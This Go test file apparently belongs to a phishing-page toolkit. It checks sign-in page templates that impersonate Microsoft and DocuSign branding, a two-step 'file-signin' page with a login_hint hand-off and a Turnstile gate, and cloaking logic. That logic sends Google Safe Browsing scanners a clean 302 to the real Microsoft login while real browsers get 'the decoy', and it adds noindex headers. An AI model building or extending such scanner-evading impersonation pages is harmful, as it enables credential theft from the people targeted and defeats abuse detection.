package core

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestListRedirectTemplates(t *testing.T) {
	ts := ListRedirectTemplates()
	if len(ts) < 8 {
		t.Fatalf("expected at least 8 templates, got %d", len(ts))
	}
	seen := map[string]bool{}
	for _, tpl := range ts {
		if tpl.Slug == "" || tpl.Title == "" || tpl.Category == "" {
			t.Errorf("template has empty fields: %+v", tpl)
		}
		if seen[tpl.Slug] {
			t.Errorf("duplicate slug %q", tpl.Slug)
		}
		seen[tpl.Slug] = true
		if tpl.Logo == "" {
			t.Errorf("template %q has no default logo", tpl.Slug)
		}
		if tpl.Delay <= 0 {
			t.Errorf("template %q has no default delay", tpl.Slug)
		}
	}
}

func TestTemplateDefaultsKnown(t *testing.T) {
	d := TemplateDefaults("ms-spinner")
	if d.Title == "" || d.TitleText == "" || d.Brand == "" {
		t.Errorf("ms-spinner defaults missing: %+v", d)
	}
	if empty := TemplateDefaults("does-not-exist"); empty.Slug != "" {
		t.Errorf("unknown template should return empty struct, got %+v", empty)
	}
}

func TestSanitizeHex(t *testing.T) {
	cases := map[string]string{
		"#fff":    "#fff",
		"0067b8":  "#0067b8",
		"#0067B8": "#0067B8",
		"zzz":     "#111111",
		"":        "#111111",
		"#12345":  "#111111",
	}
	for in, want := range cases {
		if got := sanitizeHex(in, "#111111"); got != want {
			t.Errorf("sanitizeHex(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestLogoHTML(t *testing.T) {
	if got := logoHTML("https://x.test/a.png"); !strings.Contains(got, "<img") {
		t.Errorf("url logo should render an img, got %q", got)
	}
	if got := logoHTML("microsoft"); !strings.Contains(got, "svg") {
		t.Errorf("microsoft logo should render inline svg, got %q", got)
	}
	if got := logoHTML("none"); got != "<span></span>" {
		t.Errorf("none logo should be empty, got %q", got)
	}
	if got := logoHTML("Acme Inc"); !strings.Contains(got, "Acme Inc") {
		t.Errorf("free text should be escaped into a span, got %q", got)
	}
}

func TestApplyTemplateVars(t *testing.T) {
	_, html, err := GetRedirectTemplate("ms-spinner")
	if err != nil {
		t.Fatal(err)
	}
	rp := &RedirectPage{
		Template: "ms-spinner",
		Brand:    "Contoso", Title: "Contoso sign in", Subtitle: "Use your account",
		Accent: "#7c3aed", Logo: "docusign", Button: "Go",
		Messages: []string{"one", "two"},
	}
	out := applyTemplateVars(html, rp)
	for _, want := range []string{"Contoso", "Contoso sign in", "Use your account", "#7c3aed", "docusign", "one"} {
		if !strings.Contains(out, want) {
			t.Errorf("output missing %q", want)
		}
	}
	if strings.Contains(out, "__TITLE__") || strings.Contains(out, "__ACCENT__") || strings.Contains(out, "__LOGO__") {
		t.Errorf("placeholders left unreplaced")
	}
}

func TestApplyTemplateVarsFallsBackToTemplate(t *testing.T) {
	_, html, err := GetRedirectTemplate("clean-redirect")
	if err != nil {
		t.Fatal(err)
	}
	out := applyTemplateVars(html, &RedirectPage{Template: "clean-redirect"})
	d := TemplateDefaults("clean-redirect")
	if !strings.Contains(out, d.TitleText) {
		t.Errorf("expected template default title %q in output", d.TitleText)
	}
	if strings.Contains(out, "__MSGS__") {
		t.Errorf("messages placeholder not replaced")
	}
}

// the two-step file/sign-in page must resolve every placeholder and keep the
// login_hint hand-off intact.
func TestFileSigninTemplate(t *testing.T) {
	meta, html, err := GetRedirectTemplate("file-signin")
	if err != nil {
		t.Fatal(err)
	}
	if !meta.HasSlot {
		t.Error("file-signin must expose a Turnstile slot")
	}
	out := applyTemplateVars(html, &RedirectPage{Template: "file-signin", Brand: "Acme"})
	out = strings.ReplaceAll(out, "__DESTINATION__", "https://login.example.com/auth/login")
	out = strings.ReplaceAll(out, "__DELAY__", "4")
	for _, ph := range []string{"__TITLE__", "__SUBTITLE__", "__BRAND__", "__BUTTON__", "__ACCENT__", "__LOGO__", "__MSGS__", "__DESTINATION__", "__DELAY__"} {
		if strings.Contains(out, ph) {
			t.Errorf("placeholder %s left unreplaced", ph)
		}
	}
	if !strings.Contains(out, `id="__ts_slot__"`) {
		t.Error("file-signin must keep the Turnstile slot marker")
	}
	// with Turnstile enabled the slot is filled in place
	gated := injectTurnstile(out, &RedirectPage{Template: "file-signin"}, "SITEKEY", true)
	if strings.Contains(gated, `id="__ts_slot__"`) {
		t.Error("turnstile slot should be replaced when enabled")
	}
	if !strings.Contains(gated, "cf-turnstile") || !strings.Contains(gated, "SITEKEY") {
		t.Error("turnstile widget not injected")
	}
	for _, want := range []string{"login_hint", "__tsPending", "__tsGo", "ms-input", "is-light"} {
		if !strings.Contains(out, want) {
			t.Errorf("file-signin missing %q", want)
		}
	}
	if !strings.Contains(out, meta.TitleText+"</h1>") {
		t.Errorf("step-1 heading should come from the template default")
	}
}

// scanner UAs must get a clean 302; browsers must get the substituted page.
func TestServeRedirectPage(t *testing.T) {
	dir := t.TempDir()
	_, html, err := GetRedirectTemplate("ms-spinner")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "r.html"), []byte(html), 0644); err != nil {
		t.Fatal(err)
	}
	rp := &RedirectPage{Subdomain: "r", File: "r.html", Template: "ms-spinner",
		TargetURL: "https://login.microsoftonline.com/", Delay: 2, Brand: "Contoso"}

	// bot -> 302 to the real site, never the decoy
	req := httptest.NewRequest("GET", "https://r.example.com/", nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Google-SafeBrowsing/2.0)")
	w := httptest.NewRecorder()
	ServeRedirectPage(w, req, rp, dir, "")
	if w.Code != http.StatusFound {
		t.Fatalf("bot: got %d want 302", w.Code)
	}
	if loc := w.Header().Get("Location"); loc != rp.TargetURL {
		t.Errorf("bot location = %q", loc)
	}
	if rb := w.Header().Get("X-Robots-Tag"); !strings.Contains(rb, "noindex") {
		t.Errorf("missing X-Robots-Tag, got %q", rb)
	}

	// browser -> 200 with branding + destination substituted
	req2 := httptest.NewRequest("GET", "https://r.example.com/", nil)
	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0) Chrome/131.0")
	w2 := httptest.NewRecorder()
	ServeRedirectPage(w2, req2, rp, dir, "")
	if w2.Code != http.StatusOK {
		t.Fatalf("browser: got %d want 200", w2.Code)
	}
	body := w2.Body.String()
	if !strings.Contains(body, "Contoso") || !strings.Contains(body, rp.TargetURL) {
		t.Errorf("browser body not substituted")
	}
	if !strings.Contains(body, "noscript") {
		t.Errorf("expected a noscript meta-refresh fallback")
	}
}
